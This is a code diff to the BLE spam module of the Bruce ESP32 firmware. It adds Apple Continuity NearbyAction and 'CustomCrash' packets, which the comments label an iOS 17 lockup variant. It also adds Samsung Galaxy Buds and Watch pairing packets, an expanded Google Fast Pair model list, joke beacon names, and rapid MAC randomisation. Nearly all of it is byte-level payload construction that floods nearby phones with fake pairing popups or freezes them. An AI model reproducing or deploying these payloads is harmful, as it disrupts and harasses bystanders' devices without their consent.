@@ -1,3 +1,26 @@
+/**
+ * ble_spam.cpp — BLE Spam Module for Bruce Firmware
+ *
+ * Original BLE spam implementation by Bruce/EA7KDO.
+ *
+ * Major improvements by Doominator1 (https://github.com/Doominator1):
+ *   - Unified spam UI with per-device selection, configurable interval (10ms–10s),
+ *     TX power control, MAC randomisation frequency selector, and live pkt/s stats
+ *   - Eliminated BLE stack deinit/init on MAC rotation — fixes crashes at 10ms intervals
+ *   - xorshift64* PRNG for fast MAC generation without hardware RNG overhead
+ *   - Watchdog reset in run loop for stability at tight intervals
+ *   - iOS 17 Crash, BLE Beacon spam, Swift Pair presets + persistent custom name lists
+ *   - Random/All added to Apple Pairing, Apple Action, Android, Samsung, Windows menus
+ *   - Config persistence across reboots via Preferences
+ *
+ * Packet improvements merged from MarlinSchuck (https://github.com/MarlinSchuck):
+ *   - Apple Continuity dynamic random fields matching Flipper Zero reference —
+ *     triggers iOS popups where static payloads failed (ProximityPair, NearbyAction,
+ *     CustomCrash variants)
+ *   - Samsung EasySetup Galaxy Buds packet (previously only Watch was present)
+ *   - Expanded Google FastPair model list (75+ models)
+ */
+
 #include "ble_spam.h"
 #include "core/display.h"
 #include "core/mykeyboard.h"
@@ -26,54 +49,97 @@
 #define MAX_TX_POWER ESP_PWR_LVL_P9
 #endif
 
+// ============================================================================
+// Structs used by legacy paths
+// ============================================================================
 struct BLEData {
     BLEAdvertisementData AdvData;
     BLEAdvertisementData ScanData;
 };
-
 struct WatchModel {
     uint8_t value;
 };
-
 struct mac_addr {
     unsigned char bytes[6];
 };
-
 struct Station {
     uint8_t mac[6];
     bool selected;
 };
-
-enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };
-
-const uint8_t IOS1[] = {
-    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
-};
-
-const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
-
-uint8_t *data;
-int deviceType = 0;
-
 struct DeviceType {
     uint32_t value;
 };
 
-const DeviceType android_models[] = {
-    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x00000B}, {0x00000D}, {0x000007}, {0x090000},
-    {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE}, {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400},
-    {0x1E89A7}, {0xCD8256}, {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0},
-    {0x92BBBD}, {0x000006}, {0x060000}, {0xD446A7}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00000},
-    {0xF00001}, {0xF00201}, {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91},
-    {0x04AFB8}, {0x05A963}, {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18},
-    {0x1E955B}, {0x06AE20}, {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C},
-    {0x07F426}, {0x054B2D}, {0x0660D7}, {0x0903F0}, {0xD99CA1}, {0x77FF67}, {0xAA187F}, {0xDCE9EA},
-    {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F}, {0xB37A62}, {0x92ADC9}
-};
+enum EBLEPayloadType { Microsoft, SourApple, AppleJuice, Samsung, Google };
 
-const WatchModel watch_models[26] = {{0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
-                                     {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15},
-                                     {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}};
+// ============================================================================
+// Apple Continuity — legacy static packets (used by AppleJuice legacy path)
+// ============================================================================
+const uint8_t IOS1[] = {
+    0x02, 0x0e, 0x0a, 0x0f, 0x13, 0x14, 0x03, 0x0b, 0x0c, 0x11, 0x10, 0x05, 0x06, 0x09, 0x17, 0x12, 0x16
+};
+const uint8_t IOS2[] = {0x01, 0x06, 0x20, 0x2b, 0xc0, 0x0d, 0x13, 0x27, 0x0b, 0x09, 0x02, 0x1e, 0x24};
+
+// Apple Continuity — Nearby Action type codes
+static const uint8_t continuity_na_actions[] = {
+    0x13,
+    0x24,
+    0x05,
+    0x27,
+    0x20,
+    0x19,
+    0x1E,
+    0x09,
+    0x2F,
+    0x02,
+    0x0B,
+    0x01,
+    0x06,
+    0x0D,
+    0x2B,
+};
+static const int continuity_na_actions_count =
+    sizeof(continuity_na_actions) / sizeof(continuity_na_actions[0]);
+
+// ============================================================================
+// Google Fast Pair — 3-byte model codes
+// Expanded list (Doominator1 original + MarlinSchuck additions, deduped)
+// Each triggers "New device nearby" Fast Pair popup on Android
+// ============================================================================
+const DeviceType android_models[] = {
+    {0x0001F0}, {0x000047}, {0x470000}, {0x00000A}, {0x0A0000}, {0x00000B}, {0x0B0000}, {0x00000D},
+    {0x000007}, {0x070000}, {0x000009}, {0x090000}, {0x000048}, {0x001000}, {0x00B727}, {0x01E5CE},
+    {0x0200F0}, {0x00F7D4}, {0xF00002}, {0xF00400}, {0x1E89A7}, {0x0577B1}, {0x05A9BC}, {0xCD8256},
+    {0x0000F0}, {0xF00000}, {0x821F66}, {0xF52494}, {0x718FA4}, {0x0002F0}, {0x92BBBD}, {0x000006},
+    {0x060000}, {0xD446A7}, {0x2D7A23}, {0x038B91}, {0x02F637}, {0x02D886}, {0xF00001}, {0xF00201},
+    {0xF00209}, {0xF00205}, {0xF00305}, {0xF00E97}, {0x04ACFC}, {0x04AA91}, {0x04AFB8}, {0x05A963},
+    {0x05AA91}, {0x05C452}, {0x05C95C}, {0x0602F0}, {0x0603F0}, {0x1E8B18}, {0x1E955B}, {0x06AE20},
+    {0x06C197}, {0x06C95C}, {0x06D8FC}, {0x0744B6}, {0x07A41C}, {0x07C95C}, {0x07F426}, {0x0102F0},
+    {0x054B2D}, {0x0660D7}, {0x0103F0}, {0x0903F0}, {0x9ADB11}, {0x8B66AB}, {0xD99CA1}, {0x77FF67},
+    {0xAA187F}, {0xDCE9EA}, {0x87B25F}, {0x1448C9}, {0x13B39D}, {0x7C6CDB}, {0x005EF9}, {0xE2106F},
+    {0xB37A62}, {0x92ADC9}
+};
+int android_models_count = sizeof(android_models) / sizeof(android_models[0]);
+
+// ============================================================================
+// Samsung EasySetup — Galaxy Watch + Galaxy Buds models
+// ============================================================================
+
+// Galaxy Watch — single byte model selector
+// Triggers "Galaxy Watch detected" pairing popup on Samsung Android devices
+const WatchModel watch_models[] = {{0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07},
+                                   {0x08}, {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13},
+                                   {0x14}, {0x15}, {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D},
+                                   {0x1E}, {0x20}, {0xE4}, {0xE5}, {0xEC}, {0xEF}};
+static const int watch_models_count = sizeof(watch_models) / sizeof(watch_models[0]);
+
+// Galaxy Buds — 3-byte model codes (MarlinSchuck)
+// Triggers "Galaxy Buds detected" pairing popup on Samsung Android devices
+static const uint32_t samsung_buds_models[] = {
+    0xEE7A0C, 0x9D1700, 0x39EA48, 0xA7C62C, 0x850116, 0x3D8F41, 0x3B6D02, 0xAE063C, 0xB8B905, 0xEAAA17,
+    0xD30704, 0x9DB006, 0x101F1A, 0x859608, 0x8E4503, 0x2C6740, 0x3F6718, 0x42C519, 0xAE073A, 0x011716,
+};
+static const int samsung_buds_count = sizeof(samsung_buds_models) / sizeof(samsung_buds_models[0]);
 
 char randomNameBuffer[32];
 
@@ -90,8 +156,6 @@ void generateRandomMac(uint8_t *mac) {
     esp_fill_random(mac, 6);
     mac[0] = (mac[0] & 0xFE) | 0x02;
 }
-
-int android_models_count = (sizeof(android_models) / sizeof(android_models[0]));
 
 BLEAdvertising *pAdvertising;
 
@@ -190,31 +254,77 @@ BLEAdvertisementData GetUniversalAdvertisementData(EBLEPayloadType Type, String 
             break;
         }
         case Samsung: {
-            uint8_t model = watch_models[random(26)].value;
-            uint8_t Samsung_Data[15] = {
-                0x0F,
-                0xFF,
-                0x75,
-                0x00,
-                0x01,
-                0x00,
-                0x02,
-                0x00,
-                0x01,
-                0x01,
-                0xFF,
-                0x00,
-                0x00,
-                0x43,
-                (uint8_t)((model >> 0x00) & 0xFF)
-            };
-#ifdef NIMBLE_V2_PLUS
-            AdvData.addData(Samsung_Data, 15);
-#else
-            advDataVector.assign(Samsung_Data, Samsung_Data + 15);
-            AdvData.addData(advDataVector);
+            BLEAdvertisementData AdvData = BLEAdvertisementData();
+#ifndef NIMBLE_V2_PLUS
+            static std::vector<uint8_t> advDataVector;
 #endif
-            break;
+            if (random(2) == 0) {
+                // Galaxy Watch packet
+                uint8_t model = watch_models[random(watch_models_count)].value;
+                uint8_t Samsung_Data[15] = {
+                    0x0F,
+                    0xFF,
+                    0x75,
+                    0x00,
+                    0x01,
+                    0x00,
+                    0x02,
+                    0x00,
+                    0x01,
+                    0x01,
+                    0xFF,
+                    0x00,
+                    0x00,
+                    0x43,
+                    (uint8_t)((model >> 0x00) & 0xFF)
+                };
+#ifdef NIMBLE_V2_PLUS
+                AdvData.addData(Samsung_Data, 15);
+#else
+                advDataVector.assign(Samsung_Data, Samsung_Data + 15);
+                AdvData.addData(advDataVector);
+#endif
+            } else {
+                // Galaxy Buds packet (MarlinSchuck)
+                uint32_t model = samsung_buds_models[random(samsung_buds_count)];
+                uint8_t Buds_Data[28];
+                uint8_t bi = 0;
+                Buds_Data[bi++] = 27;
+                Buds_Data[bi++] = 0xFF;
+                Buds_Data[bi++] = 0x75;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0x42;
+                Buds_Data[bi++] = 0x09;
+                Buds_Data[bi++] = 0x81;
+                Buds_Data[bi++] = 0x02;
+                Buds_Data[bi++] = 0x14;
+                Buds_Data[bi++] = 0x15;
+                Buds_Data[bi++] = 0x03;
+                Buds_Data[bi++] = 0x21;
+                Buds_Data[bi++] = 0x01;
+                Buds_Data[bi++] = 0x09;
+                Buds_Data[bi++] = (model >> 16) & 0xFF;
+                Buds_Data[bi++] = (model >> 8) & 0xFF;
+                Buds_Data[bi++] = 0x01;
+                Buds_Data[bi++] = model & 0xFF;
+                Buds_Data[bi++] = 0x06;
+                Buds_Data[bi++] = 0x3C;
+                Buds_Data[bi++] = 0x94;
+                Buds_Data[bi++] = 0x8E;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0xC7;
+                Buds_Data[bi++] = 0x00;
+#ifdef NIMBLE_V2_PLUS
+                AdvData.addData(Buds_Data, bi);
+#else
+                advDataVector.assign(Buds_Data, Buds_Data + bi);
+                AdvData.addData(advDataVector);
+#endif
+            }
+            return AdvData;
         }
         case Google: {
             const uint32_t model = android_models[rand() % android_models_count].value;
@@ -660,7 +770,22 @@ static const BleSpamAppleDevice BLE_SPAM_APPLE_ACTION_DEVICES[] = {
 static const char *BLE_SPAM_ANDROID_DEVICES[] = {"Pixel Fast Pair", "Generic Android Alert", "Random / All"};
 // Windows: indices 0..3 are presets, 4 = Random/All, 5 = custom name (handled dynamically)
 static const char *BLE_SPAM_WINDOWS_PRESETS[] = {
-    "Generic Swift Pair", "Never gonna give you up", "Bill Nye's iPhone", "Skibidi Toilet", "67"
+    "Generic Swift Pair",
+    "Never gonna give you up",
+    "Bill Nye's iPhone",
+    "Skibidi Toilet",
+    "67",
+    "FBI Surveillance Van"
+};
+
+// BLE Beacon: indices 0..N are presets, then Random/All, then saved custom names, then Add New
+static const char *BLE_SPAM_BEACON_PRESETS[] = {
+    "FBI Surveillance Van",
+    "CIA Mobile Unit",
+    "NSA Field Device",
+    "Definitely Not A Speaker",
+    "Your Neighbour's Printer",
+    "Free Candy Van WiFi"
 };
 static const char *BLE_SPAM_SAMSUNG_DEVICES[] = {
     "Galaxy Buds", "Galaxy Watch", "Generic Samsung", "Random / All"
@@ -924,8 +1049,9 @@ static int bleSpamGetDeviceCount(BleSpamAttackType type) {
             return sizeof(BLE_SPAM_SAMSUNG_DEVICES) / sizeof(BLE_SPAM_SAMSUNG_DEVICES[0]);
         case BLE_SPAM_ATTACK_IOS17_CRASH: return 1;
         case BLE_SPAM_ATTACK_BLE_BEACON: {
+            int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
             std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
-            return 1 + (int)saved.size() + 1; // Random Device Spam + saved + Add New
+            return nPresets + 1 + (int)saved.size() + 1; // presets + Random/All + saved + Add New
         }
         default: return 0;
     }
@@ -980,9 +1106,11 @@ static const char *bleSpamGetDeviceName(BleSpamAttackType type, int index) {
             return "Samsung";
         case BLE_SPAM_ATTACK_IOS17_CRASH: return "iOS 17 Crash";
         case BLE_SPAM_ATTACK_BLE_BEACON: {
-            if (index == 0) return "Random Device Spam";
+            int nPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
+            if (index >= 0 && index < nPresets) return BLE_SPAM_BEACON_PRESETS[index];
+            if (index == nPresets) return "Random Device Spam";
             std::vector<String> saved = bleSpamLoadCustomNames("bs_bn");
-            int savedBase = 1;
+            int savedBase = nPresets + 1;
             int addNewIdx = savedBase + (int)saved.size();
             if (index >= savedBase && index < addNewIdx) {
                 strncpy(
@@ -1161,15 +1289,92 @@ static uint32_t bleSpamAdvDurationMs(BleSpamAttackType attackType) {
     return BLE_SPAM_ADV_DEFAULT_MS;
 }
 
+// ============================================================================
+// Apple Continuity dynamic packet builders (MarlinSchuck)
+// Dynamic random fields matching Flipper Zero reference — triggers iOS popups
+// where static payloads failed. Only used by the new BLE spam UI Apple paths.
+// ============================================================================
+
+static size_t bleSpamBuildContinuityNearbyAction(uint8_t *buf) {
+    uint8_t action = continuity_na_actions[esp_random() % continuity_na_actions_count];
+    uint8_t flags = 0xC0;
+    if (action == 0x20 && (esp_random() % 2)) flags--;
+    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;
+    uint8_t i = 0;
+    buf[i++] = 10;
+    buf[i++] = 0xFF;
+    buf[i++] = 0x4C;
+    buf[i++] = 0x00;
+    buf[i++] = 0x0F;
+    buf[i++] = 5;
+    buf[i++] = flags;
+    buf[i++] = action;
+    esp_fill_random(&buf[i], 3);
+    i += 3;
+    return i;
+}
+
+static size_t bleSpamBuildContinuityCustomCrash(uint8_t *buf) {
+    uint8_t action = continuity_na_actions[esp_random() % continuity_na_actions_count];
+    uint8_t flags = 0xC0;
+    if (action == 0x20 && (esp_random() % 2)) flags--;
+    if (action == 0x09 && (esp_random() % 2)) flags = 0x40;
+    uint8_t i = 0;
+    buf[i++] = 16;
+    buf[i++] = 0xFF;
+    buf[i++] = 0x4C;
+    buf[i++] = 0x00;
+    buf[i++] = 0x0F;
+    buf[i++] = 5;
+    buf[i++] = flags;
+    buf[i++] = action;
+    esp_fill_random(&buf[i], 3);
+    i += 3;
+    buf[i++] = 0x00;
+    buf[i++] = 0x00;
+    buf[i++] = 0x10;
+    esp_fill_random(&buf[i], 3);
+    i += 3;
+    return i;
+}
+
+// Builds a dynamic Apple Continuity advertisement into advertisementData.
+// For Apple Action modals — uses NearbyAction and CustomCrash variants only,
+// since ProximityPair is the pairing device format used by Apple Pairing path.
+static bool bleSpamBuildAppleContinuityAdvertisement(BLEAdvertisementData &advertisementData) {
+    uint8_t buf[31];
+    size_t len = 0;
+    // 50/50 between NearbyAction and CustomCrash (iOS 17 lockup variant)
+    if (esp_random() % 2 == 0) {
+        len = bleSpamBuildContinuityNearbyAction(buf);
+    } else {
+        len = bleSpamBuildContinuityCustomCrash(buf);
+    }
+    if (len == 0) return false;
+#ifdef NIMBLE_V2_PLUS
+    advertisementData.addData(buf, len);
+#else
+    std::vector<uint8_t> dataVec(buf, buf + len);
+    advertisementData.addData(dataVec);
+#endif
+    return true;
+}
+
 static bool bleSpamBuildAdvertisementData(
     BleSpamAttackType attackType, int deviceIndex, BLEAdvertisementData &advertisementData
 ) {
     switch (attackType) {
 #if !defined(LITE_VERSION)
-        case BLE_SPAM_ATTACK_APPLE_PAIRING:
-        case BLE_SPAM_ATTACK_APPLE_ACTION: {
+        case BLE_SPAM_ATTACK_APPLE_PAIRING: {
+            // Pairing devices (AirPods, Beats etc.) use device-specific static payloads
+            // from apple_spam.cpp — each payload corresponds to a specific hardware model
             int payloadIndex = bleSpamGetApplePayloadIndex(attackType, deviceIndex);
             return buildAppleSpamAdvertisement(payloadIndex, advertisementData);
+        }
+        case BLE_SPAM_ATTACK_APPLE_ACTION: {
+            // Action modals (SetupNewPhone, AppleTV etc.) use dynamic Continuity NearbyAction
+            // packets (MarlinSchuck) — these trigger iOS popups more reliably than static payloads
+            return bleSpamBuildAppleContinuityAdvertisement(advertisementData);
         }
 #endif
         case BLE_SPAM_ATTACK_ANDROID_ALERT:
@@ -1198,35 +1403,96 @@ static bool bleSpamBuildAdvertisementData(
             advertisementData.setFlags(0x06);
             return true;
         }
-        case BLE_SPAM_ATTACK_SAMSUNG:
-            if (deviceIndex == BLE_SPAM_SAMSUNG_RANDOM_IDX) {
-                advertisementData = GetUniversalAdvertisementData(Samsung);
+        case BLE_SPAM_ATTACK_SAMSUNG: {
+            // Device list: 0=Galaxy Buds, 1=Galaxy Watch, 2=Generic Samsung, 3=Random/All
+            BLEAdvertisementData AdvData = BLEAdvertisementData();
+#ifndef NIMBLE_V2_PLUS
+            static std::vector<uint8_t> samsungDataVec;
+#endif
+            bool sendBuds;
+            if (deviceIndex == BLE_SPAM_SAMSUNG_RANDOM_IDX || deviceIndex == 2) {
+                // Random/All or Generic — pick randomly each packet
+                sendBuds = (random(2) == 0);
+            } else if (deviceIndex == 0) {
+                sendBuds = true; // Galaxy Buds
             } else {
-                advertisementData = GetUniversalAdvertisementData(Samsung);
+                sendBuds = false; // Galaxy Watch
             }
-            advertisementData.setFlags(0x06);
+
+            if (sendBuds) {
+                uint32_t model = samsung_buds_models[random(samsung_buds_count)];
+                uint8_t Buds_Data[28];
+                uint8_t bi = 0;
+                Buds_Data[bi++] = 27;
+                Buds_Data[bi++] = 0xFF;
+                Buds_Data[bi++] = 0x75;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0x42;
+                Buds_Data[bi++] = 0x09;
+                Buds_Data[bi++] = 0x81;
+                Buds_Data[bi++] = 0x02;
+                Buds_Data[bi++] = 0x14;
+                Buds_Data[bi++] = 0x15;
+                Buds_Data[bi++] = 0x03;
+                Buds_Data[bi++] = 0x21;
+                Buds_Data[bi++] = 0x01;
+                Buds_Data[bi++] = 0x09;
+                Buds_Data[bi++] = (model >> 16) & 0xFF;
+                Buds_Data[bi++] = (model >> 8) & 0xFF;
+                Buds_Data[bi++] = 0x01;
+                Buds_Data[bi++] = model & 0xFF;
+                Buds_Data[bi++] = 0x06;
+                Buds_Data[bi++] = 0x3C;
+                Buds_Data[bi++] = 0x94;
+                Buds_Data[bi++] = 0x8E;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0x00;
+                Buds_Data[bi++] = 0xC7;
+                Buds_Data[bi++] = 0x00;
+#ifdef NIMBLE_V2_PLUS
+                AdvData.addData(Buds_Data, bi);
+#else
+                samsungDataVec.assign(Buds_Data, Buds_Data + bi);
+                AdvData.addData(samsungDataVec);
+#endif
+            } else {
+                uint8_t model = watch_models[random(watch_models_count)].value;
+                uint8_t Watch_Data[15] = {
+                    0x0F, 0xFF, 0x75, 0x00, 0x01, 0x00, 0x02, 0x00, 0x01, 0x01, 0xFF, 0x00, 0x00, 0x43, model
+                };
+#ifdef NIMBLE_V2_PLUS
+                AdvData.addData(Watch_Data, 15);
+#else
+                samsungDataVec.assign(Watch_Data, Watch_Data + 15);
+                AdvData.addData(samsungDataVec);
+#endif
+            }
+            AdvData.setFlags(0x06);
+            advertisementData = AdvData;
             return true;
+        }
         case BLE_SPAM_ATTACK_IOS17_CRASH:
             advertisementData = GetUniversalAdvertisementData(SourApple);
             advertisementData.setFlags(0x06);
             return true;
         case BLE_SPAM_ATTACK_BLE_BEACON: {
-            // Build a properly structured raw AD packet that triggers pairing prompts
-            // on both iOS and Android system Bluetooth settings.
-            //
-            // Packet structure (all AD elements):
-            //   [0x02, 0x01, 0x06]              — Flags: LE General Discoverable, BR/EDR Not Supported
-            //   [0x03, 0x03, 0x12, 0x18]        — Complete 16-bit UUID list: HID (0x1812 LE)
-            //   [0x04, 0x19, 0x80, 0x01, 0x00]  — Appearance: HID Keyboard (0x0180 LE) — causes
-            //                                      iOS/Android to show keyboard pairing prompt
-            //   [len,  0x09, ...name...]         — Complete Local Name
+            int nBeaconPresets = (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
+            int randomBeaconIdx = nBeaconPresets;
             String name;
             char randomBuf[17];
-            if (bleSpamBeaconName.length() > 0) {
-                name = bleSpamBeaconName;
-            } else {
+            if (deviceIndex >= 0 && deviceIndex < nBeaconPresets) {
+                // Preset name
+                name = String(BLE_SPAM_BEACON_PRESETS[deviceIndex]);
+                bleSpamBeaconName = name;
+            } else if (deviceIndex == randomBeaconIdx || bleSpamBeaconName.length() == 0) {
+                // Random — generate fresh each packet
                 bleSpamRandomBeaconName(randomBuf);
                 name = String(randomBuf);
+            } else {
+                // Custom saved name
+                name = bleSpamBeaconName;
             }
             uint8_t nameLen = (uint8_t)min((int)name.length(), 20);
 
@@ -1269,7 +1535,7 @@ static bool bleSpamIsCacheable(BleSpamAttackType attackType) {
     // beacon with empty name = random every packet, never cache
     if (attackType == BLE_SPAM_ATTACK_BLE_BEACON && bleSpamBeaconName.length() == 0) return false;
     return attackType == BLE_SPAM_ATTACK_APPLE_PAIRING || attackType == BLE_SPAM_ATTACK_APPLE_ACTION ||
-           attackType == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR;
+           attackType == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR || attackType == BLE_SPAM_ATTACK_BLE_BEACON;
 }
 
 static const BLEAdvertisementData *
@@ -1867,9 +2133,9 @@ static bool bleSpamHandleCustomNameDevice(
 
     int nPresets = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR)
                        ? (int)(sizeof(BLE_SPAM_WINDOWS_PRESETS) / sizeof(BLE_SPAM_WINDOWS_PRESETS[0]))
-                       : 0;
-    int randomIdx = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? nPresets : -1;
-    int savedBase = (type == BLE_SPAM_ATTACK_WINDOWS_SWIFT_PAIR) ? nPresets + 1 : 1;
+                       : (int)(sizeof(BLE_SPAM_BEACON_PRESETS) / sizeof(BLE_SPAM_BEACON_PRESETS[0]));
+    int randomIdx = nPresets; // Random/All is always right after presets
+    int savedBase = nPresets + 1;
 
     std::vector<String> saved = bleSpamLoadCustomNames(ns);
     int addNewIdx = savedBase + (int)saved.size();
@@ -1881,8 +2147,9 @@ static bool bleSpamHandleCustomNameDevice(
         saved.push_back(newName);
         bleSpamSaveCustomNames(ns, saved);
         nameVar = newName;
-        selection.device_index = deviceIndex; // point at the newly saved name
-        return false;                         // don't auto-start, let them select it from list next time
+        selection.device_index = deviceIndex;
+        vTaskDelay(200 / portTICK_PERIOD_MS); // debounce — prevent stale press escaping to list
+        return false;                         // return to device list, not to spam menu
     }
 
     if (deviceIndex >= savedBase && deviceIndex < addNewIdx) {
